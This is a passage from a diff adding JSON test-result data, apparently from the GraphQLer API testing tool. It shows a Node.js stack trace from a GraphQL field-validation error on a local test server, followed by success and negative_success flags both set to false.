+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
